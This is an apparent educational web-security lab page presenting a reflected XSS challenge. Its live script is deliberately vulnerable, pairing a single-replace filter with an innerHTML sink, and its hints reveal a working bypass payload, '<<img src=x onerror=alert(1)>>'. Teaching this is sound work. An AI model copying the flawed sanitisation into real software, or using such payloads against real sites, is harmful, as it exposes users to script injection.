---
layout: default
title: "Challenge 1 — Reflected XSS (innerHTML)"
back_url: /hack/
back_label: "← Hack Lab"
---

<div class="challenge-wrap">

  <!-- Header -->
  <div class="challenge-header">
    <span class="hack-badge hack-badge-easy">Easy</span>
    <h1 class="challenge-title">Challenge 1 — Reflected XSS (innerHTML)</h1>
  </div>

  <!-- Briefing -->
  <div class="challenge-briefing">
    <h3>// Mission Briefing</h3>
    <p>
      This page takes your name from an input field, applies a naive sanitisation pass, and writes it
      directly into the DOM via <code>innerHTML</code>. The filter calls <code>.replace()</code> to strip
      one <code>&lt;</code> and one <code>&gt;</code> — but a single replace isn't the same as stripping <em>all</em> of them.
    </p>
    <p class="challenge-objective">Objective: trigger <code>alert(1)</code> — or any <code>alert()</code> call — to mark this challenge solved.</p>
  </div>

  <!-- Vulnerable code viewer -->
  <div class="challenge-code-viewer">
    <div class="code-viewer-bar">
      <span class="code-viewer-dot cvd-red"></span>
      <span class="code-viewer-dot cvd-yellow"></span>
      <span class="code-viewer-dot cvd-green"></span>
      <span>// vulnerable snippet</span>
    </div>
    <pre><code>submitButton.addEventListener('click', function() {
    let name = nameInput.value;

    // "sanitisation" — removes ONE &lt; and ONE &gt; (not all of them!)
    name = name.replace("&lt;","").replace("&gt;","");

    // 🔴 sink: raw HTML injection via innerHTML
    outputSpan.innerHTML = name;
});</code></pre>
  </div>

  <!-- Success banner (hidden until triggered) -->
  <div class="challenge-success" id="successBanner">
    <span class="challenge-success-icon">🎉</span>
    <h3>Challenge Solved!</h3>
    <p>You bypassed the filter and executed JavaScript via an innerHTML sink. Nice work.</p>
  </div>

  <!-- Playground -->
  <div class="challenge-playground">
    <span class="playground-label">// Playground — try your payload</span>
    <div class="playground-row">
      <input type="text" class="playground-input" id="nameInput" placeholder="Enter your name (or payload)...">
      <button class="playground-btn" id="submitName">Submit</button>
    </div>
    <div class="playground-output-area">
      <h2>Welcome <span id="outputName"></span></h2>
    </div>
  </div>

  <!-- Hints -->
  <div class="challenge-hints">
    <div class="hints-header">
      <span class="hints-header-title">// Progressive Hints</span>
      <button class="hint-btn" id="hint1Btn">Hint 1</button>
    </div>
    <div class="hint-block" id="hint1">
      <span class="hint-label">hint 1 / 3</span>
      <p>The filter uses <code>.replace()</code> — not <code>.replaceAll()</code>. In JavaScript, <code>String.replace()</code> with a plain string argument only removes the <em>first</em> occurrence. What happens if you give it more than one?</p>
      <button class="hint-btn" style="margin-top:0.6rem" id="hint2Btn">Hint 2</button>
    </div>
    <div class="hint-block" id="hint2">
      <span class="hint-label">hint 2 / 3</span>
      <p>If you send <code>&lt;&lt;img src=x onerror=alert(1)&gt;&gt;</code>, the filter strips only the first <code>&lt;</code> and first <code>&gt;</code>, leaving a valid <code>&lt;img&gt;</code> tag that innerHTML will execute. Try doubling your brackets.</p>
      <button class="hint-btn" style="margin-top:0.6rem" id="hint3Btn">Reveal Answer</button>
    </div>
    <div class="hint-block" id="hint3">
      <span class="hint-label">answer</span>
      <p>Paste this into the input and click Submit:<br>
      <code>&lt;&lt;img src=x onerror=alert(1)&gt;&gt;</code><br><br>
      After the filter: <code>replace("&lt;","") → &lt;img src=x onerror=alert(1)&gt;&gt;</code><br>
      Then: <code>replace("&gt;","") → &lt;img src=x onerror=alert(1)&gt;</code><br>
      innerHTML sees a valid img tag — <code>onerror</code> fires.</p>
    </div>
  </div>

  <!-- Nav -->
  <div class="challenge-nav">
    <a href="/hack/">← Back to Lab</a>
    <a href="/hack/reflected-xss-two.html" class="next-challenge">Next Challenge →</a>
  </div>

</div>

<script>
(function() {
    var _alert = window.alert;
    window.alert = function(msg) {
        _alert.call(window, msg);
        localStorage.setItem('hack-solved-xss1', 'true');
        document.getElementById('successBanner').classList.add('visible');
    };

    var hints = {
        hint1Btn: 'hint1',
        hint2Btn: 'hint2',
        hint3Btn: 'hint3'
    };
    Object.keys(hints).forEach(function(btnId) {
        var btn = document.getElementById(btnId);
        if (btn) {
            btn.addEventListener('click', function() {
                document.getElementById(hints[btnId]).classList.add('visible');
                btn.style.display = 'none';
            });
        }
    });

    document.getElementById('submitName').addEventListener('click', function() {
        var name = document.getElementById('nameInput').value;
        name = name.replace('<','').replace('>','');
        document.getElementById('outputName').innerHTML = name;
    });

    // restore solved state
    if (localStorage.getItem('hack-solved-xss1') === 'true') {
        document.getElementById('successBanner').classList.add('visible');
    }
})();
</script>
